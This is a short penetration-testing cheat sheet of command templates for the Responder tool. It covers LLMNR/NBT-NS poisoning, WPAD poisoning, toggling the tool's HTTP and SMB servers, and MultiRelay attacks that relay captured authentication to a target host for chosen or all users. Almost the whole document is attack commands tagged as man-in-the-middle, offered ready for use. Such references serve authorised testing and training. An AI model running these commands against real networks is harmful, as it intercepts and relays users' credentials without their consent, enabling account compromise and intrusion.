# responder

% responder, LLMNR, NBT-NS, Poisoning, man in the middle

## analyze mode (no poisoning)
#tag/responder
```
responder –I <interface> -A
```

## poison
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder –I <interface>
```
## poison with another ip
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder –I <interface> -e <ip>
```

## poison with wpad file 
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder -I <interface> --wpad
```

## turn http on
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/HTTP = Off/HTTP = On/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'HTTP ='
```

## turn http off
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'HTTP ='
```

## turn smb on
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/SMB = Off/SMB = On/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'SMB ='
```

## turn smb off 
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'SMB ='
```

## multirelay attack - user filtered (previous disable HTTP and SMB)
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
multirelay -t <ip> -u <user1> <user2>
```

## multirelay attack - all user (previous disable HTTP and SMB)
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
multirelay -t <ip> -u ALL
```
